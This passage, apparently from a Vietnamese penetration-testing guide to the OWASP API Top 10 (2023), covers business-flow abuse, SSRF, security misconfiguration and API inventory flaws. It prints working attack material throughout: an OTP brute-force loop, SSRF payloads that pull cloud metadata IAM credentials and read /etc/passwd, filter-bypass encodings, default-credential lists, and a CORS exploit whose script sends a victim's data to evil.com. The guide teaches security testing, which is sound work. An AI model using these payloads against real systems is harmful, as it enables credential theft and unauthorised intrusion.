    for otp in range(1000, 9999):  # 4-digit OTP
        r = requests.post("/api/verify", json={"phone": phone, "otp": otp})
        if r.status_code == 200:
            break
```

---

### 7. Flash Sale / Limited Item Race Condition
Gửi nhiều request đồng thời để mua vượt giới hạn số lượng.
```python
# Gửi 50 request cùng lúc — server xử lý song song
# Nếu không có lock → mua được nhiều hơn giới hạn
import requests, concurrent.futures

def buy():
    return requests.post("/api/flash-sale/buy",
        headers={"Authorization": "Bearer <token>"},
        json={"item_id": 1})

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    futures = [ex.submit(buy) for _ in range(50)]
```

---

## Checklist khi test

- [ ] Tìm luồng có giá trị kinh doanh: mua hàng, đặt vé, đổi điểm, áp mã giảm giá
- [ ] Thử gọi lặp lại cùng một action nhiều lần — có bị chặn không?
- [ ] Kiểm tra giới hạn số lượng có được enforce ở server hay chỉ ở UI
- [ ] Thử race condition trên các endpoint mua hàng / đổi thưởng
- [ ] Kiểm tra mã giảm giá có bị invalidate sau khi dùng / hủy đơn không
- [ ] Tạo nhiều account test — mỗi account có được hưởng ưu đãi riêng không?
- [ ] Kiểm tra giá có được tính lại ở server khi checkout không hay tin vào client

---

# API7:2023 — Server Side Request Forgery (SSRF)

## Khái niệm

SSRF xảy ra khi API **nhận URL từ phía client rồi tự gọi request đến URL đó** mà không kiểm tra URL đó trỏ đến đâu. Attacker lợi dụng điều này để bắt server gọi vào **mạng nội bộ, metadata service, hoặc các dịch vụ không public**.

**Ví dụ thực tế:**
App có tính năng "Import ảnh từ URL". Bạn dán URL ảnh vào, server tự fetch về. Thay vì dán URL ảnh thật, bạn dán `http://169.254.169.254/latest/meta-data/` — đó là AWS Instance Metadata Service. Server fetch về và trả lại cho bạn thông tin IAM credentials của máy chủ.

**Điểm mấu chốt:**
Attacker không tự gọi được vào mạng nội bộ của server, nhưng **bắt server gọi hộ** — server đóng vai trò proxy không có chủ ý.

> **CWE liên quan:** CWE-918 — Server-Side Request Forgery

---

## Tại sao bị lỗi?

| Nguyên nhân | Mô tả |
|-------------|-------|
| Không validate URL đầu vào | Chấp nhận bất kỳ URL nào client gửi |
| Không có allowlist domain | Không giới hạn chỉ fetch từ domain được phép |
| Không block IP nội bộ | Cho phép fetch `127.0.0.1`, `10.x`, `172.16.x`, `169.254.x` |
| Tin vào DNS resolution | Attacker dùng DNS rebinding để bypass IP check |

---

## Kịch bản kinh điển

### 🎯 SSRF → AWS IMDSv1 → Lấy IAM Credentials

**Môi trường:** App chạy trên EC2, có endpoint nhận URL để fetch ảnh.

**Bước 1 — Phát hiện SSRF**
```http
# [ATTACKER] — gửi URL trỏ vào Burp Collaborator để xác nhận server có fetch không
POST /api/images/import HTTP/1.1
Authorization: Bearer <token>

{"url": "http://<burp_collaborator_id>.burpcollaborator.net"}
```
Nếu Collaborator nhận được request → xác nhận SSRF tồn tại.

**Bước 2 — Probe mạng nội bộ**
```http
# Thử truy cập localhost
POST /api/images/import HTTP/1.1
{"url": "http://127.0.0.1"}
{"url": "http://127.0.0.1:8080"}
{"url": "http://127.0.0.1:6379"}   ← Redis
{"url": "http://127.0.0.1:27017"}  ← MongoDB
```

**Bước 3 — Truy cập AWS Metadata Service**
```http
# IMDSv1 không cần auth — chỉ cần gọi được từ trong EC2
POST /api/images/import HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/"}
```
Response trả về:
```
ami-id
hostname
iam/
instance-id
local-ipv4
...
```

**Bước 4 — Lấy IAM Role Name**
```http
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```
Response: `ec2-production-role`

**Bước 5 — Lấy Credentials**
```http
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-production-role"}
```
Response:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "<secret>",
  "Token": "<session_token>",
  "Expiration": "2024-12-31T23:59:59Z"
}
```

**Bước 6 — Sử dụng Credentials**
```bash
# [ATTACKER] — cấu hình AWS CLI với credentials vừa lấy
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key <secret>
aws configure set aws_session_token <session_token>

# Liệt kê tài nguyên
aws s3 ls
aws iam get-user
aws ec2 describe-instances
```

---

## Các cách khai thác

### 1. Basic SSRF — Đọc File Nội Bộ
```http
POST /api/fetch HTTP/1.1
{"url": "file:///etc/passwd"}
{"url": "file:///etc/hosts"}
{"url": "file:///proc/self/environ"}
```

---

### 2. Internal Network Scan
Dùng SSRF để scan port và dịch vụ trong mạng nội bộ.
```http
{"url": "http://192.168.1.1"}    ← router
{"url": "http://10.0.0.1:9200"}  ← Elasticsearch
{"url": "http://10.0.0.1:5984"}  ← CouchDB
{"url": "http://10.0.0.1:2375"}  ← Docker API
```
Dựa vào response time và nội dung để xác định port mở/đóng.

---

### 3. Cloud Metadata — GCP / Azure
```http
# GCP
{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}

# Azure
{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}
```

---

### 4. Bypass Filter bằng URL Encoding / Redirect
```http
# Bypass blacklist IP bằng các dạng viết khác của 127.0.0.1
{"url": "http://0x7f000001"}          ← hex
{"url": "http://2130706433"}          ← decimal
{"url": "http://127.1"}               ← short form
{"url": "http://[::1]"}               ← IPv6 localhost
{"url": "http://localtest.me"}        ← DNS resolve về 127.0.0.1

# Dùng open redirect để bypass
{"url": "https://trusted.com/redirect?url=http://169.254.169.254"}
```

---

### 5. Blind SSRF — Không Có Response
Server fetch nhưng không trả nội dung về → dùng out-of-band để xác nhận.
```http
# Dùng Burp Collaborator / interactsh
{"url": "http://<collaborator_id>.oast.fun"}

# Hoặc DNS lookup
{"url": "http://ssrf-test.<collaborator_id>.oast.fun"}
```

---

### 6. SSRF → Internal API Abuse
Gọi vào internal API không có auth vì chỉ lắng nghe localhost.
```http
# Internal admin API chỉ bind trên 127.0.0.1
{"url": "http://127.0.0.1:8081/admin/users"}
{"url": "http://127.0.0.1:8081/admin/reset-password?user_id=1"}
```

---

## Checklist khi test

- [ ] Tìm tất cả tham số nhận URL: `url`, `uri`, `path`, `src`, `href`, `redirect`, `callback`, `webhook`
- [ ] Gửi URL trỏ vào Burp Collaborator — xác nhận server có fetch không
- [ ] Thử `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254`
- [ ] Thử các dạng bypass: hex, decimal, IPv6, short form, DNS rebinding
- [ ] Scan port nội bộ phổ biến: 6379 (Redis), 9200 (ES), 2375 (Docker), 5984 (CouchDB)
- [ ] Kiểm tra cloud metadata endpoint tương ứng (AWS/GCP/Azure)
- [ ] Thử `file://` protocol để đọc file hệ thống
- [ ] Kiểm tra open redirect có thể dùng để bypass URL filter không

---

# API8:2023 — Security Misconfiguration

## Khái niệm

Security Misconfiguration xảy ra khi **hệ thống được cấu hình sai hoặc thiếu cấu hình bảo mật**, tạo ra các điểm yếu mà attacker có thể khai thác mà không cần kỹ thuật phức tạp.

**Ví dụ thực tế:**
Dev deploy API lên production nhưng quên tắt debug mode. Response trả về stack trace đầy đủ kể cả tên thư viện, phiên bản, đường dẫn file trên server — attacker có ngay bản đồ để tìm CVE tương ứng.

**Điểm mấu chốt:**
Khác với các lỗi trước đòi hỏi logic khai thác phức tạp, Security Misconfiguration thường **lộ ra ngay từ bước reconnaissance** — chỉ cần gửi request và đọc response cẩn thận.

> **CWE liên quan:** CWE-16 — Configuration

---

## Tại sao bị lỗi?

| Nguyên nhân | Mô tả |
|-------------|-------|
| Debug mode bật trên production | Stack trace, error detail lộ ra ngoài |
| Default credentials | Admin/admin, root/root chưa đổi |
| CORS cấu hình sai | `Access-Control-Allow-Origin: *` trên API nhạy cảm |
| HTTP header bảo mật thiếu | Không có `HSTS`, `X-Frame-Options`, `CSP` |
| TLS cấu hình yếu | Hỗ trợ TLS 1.0/1.1, cipher suite yếu |
| Endpoint nhạy cảm public | `/actuator`, `/metrics`, `/debug`, `/env` lộ ra ngoài |
| Verbose error message | Response tiết lộ tên DB, query, đường dẫn file |

---

## Các cách khai thác

### 1. Verbose Error — Đọc Stack Trace
Gửi request sai cố ý để trigger error và đọc thông tin hệ thống.
```http
# Gửi sai kiểu dữ liệu
GET /api/users/abc HTTP/1.1   ← truyền string thay vì integer

GET /api/orders?date=not-a-date HTTP/1.1

POST /api/login HTTP/1.1
{"username": null, "password": null}
```
Nếu server trả về:
```json
{
  "error": "invalid input syntax for type integer: \"abc\"",
  "detail": "SELECT * FROM users WHERE id = 'abc'",
  "hint": "PostgreSQL 14.2 on x86_64-pc-linux-gnu"
}
```
→ Lộ DB engine, phiên bản, cấu trúc query.

---

### 2. Default Credentials
Thử các credential mặc định của framework / service phổ biến.
```http
POST /api/login HTTP/1.1
{"username": "admin",    "password": "admin"}
{"username": "admin",    "password": "password"}
{"username": "admin",    "password": "123456"}
{"username": "root",     "password": "root"}
{"username": "test",     "password": "test"}
{"username": "swagger",  "password": "swagger"}
```

---

### 3. CORS Misconfiguration
Server phản chiếu bất kỳ `Origin` nào → attacker có thể đọc response từ domain khác.
```http
# Gửi request với Origin giả
GET /api/users/me HTTP/1.1
Origin: https://evil.com

# Response bị lỗi trả về
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
Attacker dùng trang web của mình để đọc API response của victim.
```javascript
// [ATTACKER] — chạy trên evil.com
fetch("https://target.lab/api/users/me", { credentials: "include" })
  .then(r => r.json())
  .then(data => fetch("https://evil.com/steal?d=" + JSON.stringify(data)))
```

---

### 4. Exposed Debug / Admin Endpoint
Các endpoint quản trị bị để public mà không có auth.
```http
# Spring Boot Actuator
GET /actuator HTTP/1.1
GET /actuator/env HTTP/1.1        ← biến môi trường, credentials
GET /actuator/heapdump HTTP/1.1   ← dump toàn bộ memory
GET /actuator/mappings HTTP/1.1   ← danh sách tất cả endpoint

# Laravel Telescope / Debugbar
GET /_debugbar/open HTTP/1.1
GET /telescope/api/requests HTTP/1.1

# Django Debug
GET /admin/ HTTP/1.1
```

---

### 5. HTTP Security Header Missing
Kiểm tra header bảo mật bị thiếu — mở đường cho XSS, clickjacking, MITM.
```bash
# [ATTACKER]
curl -I https://target.lab/api/users/me
```
Nếu response thiếu các header sau → misconfiguration:
```
Strict-Transport-Security    ← thiếu → dễ bị MITM downgrade
X-Content-Type-Options       ← thiếu → MIME sniffing
X-Frame-Options              ← thiếu → clickjacking
Content-Security-Policy      ← thiếu → XSS dễ khai thác hơn
```

---

### 6. Unnecessary HTTP Methods
Server cho phép các method không cần thiết.
```http
OPTIONS /api/users HTTP/1.1

# Response tiết lộ
Allow: GET, POST, PUT, DELETE, PATCH, TRACE, CONNECT
```
`TRACE` có thể bị lợi dụng để đọc cookie HttpOnly qua XST (Cross-Site Tracing).

---

### 7. TLS / SSL Misconfiguration
```bash
# [ATTACKER] — kiểm tra phiên bản TLS và cipher suite
nmap --script ssl-enum-ciphers -p 443 target.lab

# Hoặc dùng testssl.sh
testssl.sh https://target.lab
```
Nếu server hỗ trợ TLS 1.0/1.1 hoặc cipher yếu (RC4, DES, NULL) → dễ bị downgrade attack.

---

### 8. Sensitive Data trong Response Header
Header đôi khi tiết lộ thông tin stack.
```http
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Ubuntu)    ← phiên bản có CVE-2021-41773
X-Powered-By: PHP/7.4.3            ← phiên bản có nhiều CVE
X-AspNet-Version: 4.0.30319
```

---

## Checklist khi test

- [ ] Gửi request sai kiểu dữ liệu — response có stack trace / query không?
- [ ] Thử default credentials trên tất cả login endpoint
- [ ] Kiểm tra CORS — gửi `Origin: https://evil.com` xem có bị reflect không
- [ ] Fuzz các path `/actuator`, `/debug`, `/env`, `/metrics`, `/health`, `/info`
- [ ] Kiểm tra HTTP security header bằng `curl -I` hoặc securityheaders.com
- [ ] Gửi `OPTIONS` — có method `TRACE` / `CONNECT` không?
- [ ] Kiểm tra `Server`, `X-Powered-By` header — có tiết lộ phiên bản không?
- [ ] Scan TLS bằng `testssl.sh` hoặc `nmap ssl-enum-ciphers`
- [ ] Kiểm tra Swagger / OpenAPI có bị public không (`/swagger-ui`, `/api-docs`)

---

# API9:2023 — Improper Inventory Management

## Khái niệm

Improper Inventory Management xảy ra khi tổ chức **không nắm rõ toàn bộ các API đang chạy** — bao gồm API cũ, API test, API của bên thứ ba, API ở các môi trường khác nhau — dẫn đến các endpoint không được bảo vệ, vá lỗi, hoặc theo dõi.

**Ví dụ thực tế:**
Team dev ra mắt API v2 với đầy đủ auth và rate limit. Nhưng API v1 vẫn còn chạy, không ai nhớ để tắt. Attacker tìm ra v1, gọi thẳng vào — không có rate limit, không có patch bảo mật mới nhất, và đôi khi không cần auth.

**Điểm mấu chốt:**
Không phải lỗi code — là lỗi **quản lý và kiểm soát**. API bị bỏ quên thường là mục tiêu dễ nhất vì không ai theo dõi nó.

> **CWE liên quan:** CWE-1059 — Incomplete Documentation

---

## Tại sao bị lỗi?

| Nguyên nhân | Mô tả |
|-------------|-------|
| API version cũ không bị tắt | `/v1/` vẫn chạy sau khi `/v2/` ra mắt |
| Môi trường staging/dev lộ ra ngoài | `api.staging.target.com` public và dùng data thật |
| API của bên thứ ba không được kiểm soát | Vendor API được tích hợp nhưng không được audit |
| Không có API inventory | Không ai biết có bao nhiêu endpoint đang chạy |
| Shadow API | Endpoint được tạo ra nhưng không được document |
| Microservice nội bộ lộ ra ngoài | Service chỉ dành cho internal nhưng bị expose public |

---

## Các cách khai thác

### 1. API Version Enumeration
Tìm các version cũ còn chạy và thiếu bảo mật.
```bash
# [ATTACKER] — fuzz version
ffuf -u https://target.lab/api/FUZZ/users \
  -w versions.txt \
  -mc 200,201,301

# versions.txt
v1
v2
v3
v1.0
v1.1
beta
old
legacy
test
dev
```
```http
# So sánh bảo mật giữa các version
GET /api/v1/users HTTP/1.1   → 200 OK, không cần token
GET /api/v2/users HTTP/1.1   → 401 Unauthorized
```

---

### 2. Staging / Dev Environment Discovery
Môi trường test thường có bảo mật lỏng hơn production nhưng dùng chung data thật.
```bash
# [ATTACKER] — enum subdomain
ffuf -u https://FUZZ.target.lab \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,301,302

# Các subdomain phổ biến cần kiểm tra
api.staging.target.lab
api.dev.target.lab
api.test.target.lab
api.uat.target.lab
api.sandbox.target.lab
api.internal.target.lab
```

---

### 3. Shadow API — Endpoint Không Được Document
Endpoint tồn tại nhưng không có trong docs — thường thiếu auth check.
```bash
# Fuzz endpoint ẩn
ffuf -u https://target.lab/api/v1/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt \
  -H "Authorization: Bearer <token>" \
  -mc 200,201,204
```
```http
# Ví dụ endpoint ẩn thường gặp
GET /api/v1/export          ← export toàn bộ data
GET /api/v1/debug/users     ← debug endpoint quên xóa
POST /api/v1/admin/migrate  ← endpoint migration còn sót
```

---

### 4. Mobile App / JS Bundle Recon
Client-side code thường chứa URL endpoint ẩn mà server chưa tắt.
```bash
# [ATTACKER] — tìm endpoint trong JS bundle
curl https://target.lab/static/main.js | grep -oE '"/api/[^"]+"' | sort -u

# Hoặc decompile APK
apktool d target.apk
grep -r "api/" target/smali/ | grep -oE '/api/[a-zA-Z0-9/_-]+' | sort -u
```

---

### 5. Exposed Internal Microservice
Service nội bộ vô tình bị expose ra internet.
```http
# Các port microservice phổ biến
GET https://target.lab:8080/internal/users HTTP/1.1
GET https://target.lab:3000/admin HTTP/1.1
GET https://target.lab:9090/metrics HTTP/1.1   ← Prometheus
GET https://target.lab:8500/v1/catalog/services  ← Consul
```

---

### 6. Deprecated Endpoint Vẫn Hoạt Động
Endpoint cũ được thông báo deprecated nhưng chưa bị tắt, thiếu các patch bảo mật mới.
```http
# Endpoint mới đã được vá BOLA
GET /api/v2/orders/1001 HTTP/1.1  → 403 (có ownership check)

# Endpoint cũ chưa được vá
GET /api/v1/orders/1001 HTTP/1.1  → 200 OK (không có ownership check)
```

---

## Checklist khi test

- [ ] Fuzz API version: `v1`, `v2`, `beta`, `legacy`, `old`, `test`, `dev`
- [ ] Enum subdomain tìm môi trường staging/dev/uat
- [ ] Fuzz endpoint ẩn bằng SecLists API wordlist
- [ ] Đọc JS bundle / decompile APK để tìm URL endpoint
- [ ] Scan port phổ biến của microservice (8080, 3000, 9090, 8500)
- [ ] So sánh bảo mật giữa các version — v1 có thiếu patch mà v2 đã vá không?
- [ ] Kiểm tra Swagger có liệt kê đủ tất cả endpoint không hay có endpoint ẩn
- [ ] Kiểm tra môi trường staging có dùng data thật không
